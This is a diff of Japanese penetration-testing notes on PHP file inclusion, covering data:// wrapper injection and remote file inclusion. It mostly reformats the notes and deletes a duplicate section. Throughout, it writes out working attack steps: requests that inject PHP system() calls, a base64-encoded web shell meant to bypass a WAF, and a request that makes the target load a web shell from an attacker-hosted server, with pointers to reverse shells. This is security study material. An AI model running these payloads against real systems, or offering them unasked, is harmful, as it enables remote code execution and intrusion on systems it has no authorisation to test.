@@ -122,11 +122,9 @@ GET /index.php?page=data://text/plain,<?php%20echo%20system('ls');?>
 ```
 
 3. WAFなどでブロックされる場合はBase64エンコードして試す
-
 ```zsh
 echo -n '<?php echo system($_GET["cmd"]);?>' | base64
 ```
-
 ```http
 GET /index.php?page=data://text/plain;base64,<base64_encoded_php_code>&cmd=ls
 ```
@@ -143,90 +141,21 @@ GET /index.php?page=data://text/plain;base64,<base64_encoded_php_code>&cmd=ls
 
 **用途：** LFIとほぼ同じだが、HTTP/SMBを介して**リモートシステム**（攻撃者がホストするサーバーなど）からファイルをインクルードして実行できる。
 
-> [!WARNING] PHPの `allow_url_include` が有効でないと使えない（デフォルト無効）。
+> [!WARNING]
+> PHPの `allow_url_include` が有効でないと使えない（デフォルト無効）。
 
 ## 手順
 
 1. ターゲットに実行させたいファイル（WebShell）を攻撃者のマシンに用意する
-    
     - `/usr/share/webshells/php/`
     - pentest-monkeyのreverse shellなど
-2. ファイルをホストしているディレクトリでWebサーバーを起動する
-    
 
+2. ファイルをホストしているディレクトリでWebサーバーを起動する
 ```zsh
 sudo python3 -m http.server 80
 ```
 
 3. Burp Suiteで攻撃者がホストするファイルをターゲットに実行させる
-
 ```http
 GET /index.php?page=http://<attacker_IP>/<webshell.php>&cmd=ls
-```
-
-
----
----
-
-
-#### data://
-
-##### 概要
-
-- 用途：任意のコマンドを実行させる
-- 攻撃シチュエーション：
-	- 対象のマシンに直接PHPコードを埋め込むことができない場合(※)
-	- また、HTTPリクエストでファイルを指定しているとき
-		- (※：`<?php echo system($_GET['cmd']); ?>`などをwebアプリに埋め込むことができずwebshell使えないときなど）
-	- ⚠️注意：PHPの[`allow_url_include`]([https://www.php.net/manual/en/filesystem.configuration.php](https://www.php.net/manual/en/filesystem.configuration.php))と`allow_url_fopen`が有効のときしか使えない(デフォルト無効になっている)
-- 仕組み：データ要素をプレーンテキストもしくはbase64エンコードして実行中のwebアプリのコードに埋め込む
-
-##### data wrapperによるRCE手順
-
-1. HTTPリクエストでファイルを指定している箇所を見つける（以下例↓）
-```
-http://example.com/index.php?page=admin.php
-```
-
-2. Burp Suiteにて、data://を使い、任意の任意のコマンドを実行する
-```http
-GET /index.php?page=data://text/plain,<?php%20echo%20system('ls');?>
-```
-
-3. WAF等が原因でコード実行が妨げられる場合は、data://ではbase64エンコードが使えるので試す
-```zsh
-echo -n '<?php echo system($_GET["cmd"]);?>' | base64
-```
-```http
-GET /index.php?page=data://text/plain;base64,<base64_encoded_php_code>&cmd=ls"
-```
-
-##### 🔗参考
-
-- filter : [php manual](https://www.php.net/manual/en/wrappers.php.php)
-- data : [php manual](https://www.php.net/manual/en/wrappers.data.php)
-- その他のwrapper : [php manual](https://www.php.net/manual/en/wrappers.php)
-
-### RFI
-
-#### RFIの概要
-
-- 用途：LFIとほぼ同じ。異なるのは、HTTP1やSMB2を介して<u>リモートシステム</u>(攻撃者のホストするサーバ等)からファイルをインクルード可能なところ
-- シチュエーション・使い方：LFIと同じ → [Module 8 x Module 9： Web Application Attacks](#LFI%20x%20ログポイズニング)
-- ⚠️注意：PHPの🔗[`allow_url_include`]([https://www.php.net/manual/en/filesystem.configuration.php](https://www.php.net/manual/en/filesystem.configuration.php))が有効でないと使えない（デフォルト無効）
-
-#### RFI実行手順
-
-1. ターゲットのWebアプリに実行させたいファイル（WebShell）などを攻撃者のマシンにホストする
-	- `/usr/share/webshells/php`
-	- pentest-monkeyのreverse shellなど
-
-2. ファイルをホストしているディレクトリ上でwebサーバーを開始
-```zsh
-sudo python -m http.server 80
-```
-
-3. Burp Suite上で、ターゲットのWebアプリから攻撃者がホストするファイルを実行させ、任意のコマンドを実行する
-```
-GET /index.php?page=http://<AttackerIP>/<webshell.php>&cmd=ls
 ```
